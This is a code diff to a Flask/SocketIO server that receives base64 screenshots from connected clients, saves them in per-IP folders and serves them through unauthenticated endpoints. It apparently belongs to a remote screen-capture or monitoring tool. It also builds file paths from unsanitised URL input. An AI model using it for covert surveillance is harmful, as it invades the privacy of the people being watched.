@@ -1,5 +1,7 @@
 import base64
+from datetime import datetime
 from flask import Flask, request, jsonify
+from flask import send_from_directory
 from flask_socketio import SocketIO
 import os
 
@@ -33,6 +35,41 @@ def get_clients():
     return jsonify({'status': 'success', 'clients': clients_info}), 200
 
 
+@app.route('/api/v1/screenshot', methods=['GET'])
+def get_screenshots():
+    screenshots = []
+    print(clients.values())
+    for client_ip in clients.values():
+        screenshot_dir = f"screenshots/{client_ip}"
+        print(screenshot_dir)
+        if os.path.exists(screenshot_dir):
+            screenshots.extend([f"{screenshot_dir}/{screenshot}" for screenshot in os.listdir(screenshot_dir)])
+    return jsonify({'status': 'success', 'screenshots': screenshots}), 200
+
+
+@app.route('/api/v1/screenshot/<ip>', methods=['GET'])
+def get_screenshots_by_ip(ip):
+    screenshots = []
+    screenshot_dir = f"screenshots/{ip}"
+    if os.path.exists(screenshot_dir):
+        screenshots = [f"{screenshot_dir}/{screenshot}" for screenshot in os.listdir(screenshot_dir)]
+    return jsonify({'status': 'success', 'screenshots': screenshots}), 200
+
+
+@app.route('/screenshots/<path:filename>')
+def serve_screenshot(filename):
+    return send_from_directory('screenshots', filename)
+
+
+@app.route('/api/v1/screenshot/<ip>/<screenshot>', methods=['GET'])
+def get_screenshot(ip, screenshot):
+    screenshot_path = f"screenshots/{ip}/{screenshot}"
+    if os.path.exists(screenshot_path):
+        return send_from_directory('screenshots', f"{ip}/{screenshot}")
+    else:
+        return jsonify({'status': 'error', 'message': 'Capture d\'écran non trouvée.'}), 404
+
+
 @socketio.on('connect')
 def handle_connect():
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
@@ -44,9 +81,13 @@ def handle_connect():
 def handle_screenshot(data):
     screenshot = data.get('screenshot')
     screenshot_bytes = base64.b64decode(screenshot)
-    with open('screenshot.png', 'wb') as f:
+    client_ip = clients.get(request.sid)
+    screenshot_dir = f"screenshots/{client_ip}"
+    os.makedirs(screenshot_dir, exist_ok=True)
+    screenshot_path = f"{screenshot_dir}/{datetime.now().strftime('%d-%m-%Y_%H-%M-%S')}.png"
+    with open(screenshot_path, 'wb') as f:
         f.write(screenshot_bytes)
-    print("Capture d'écran reçue et enregistrée.")
+    print(f"Capture d'écran reçue et enregistrée : {screenshot_path}")
 
 
 @socketio.on('disconnect')
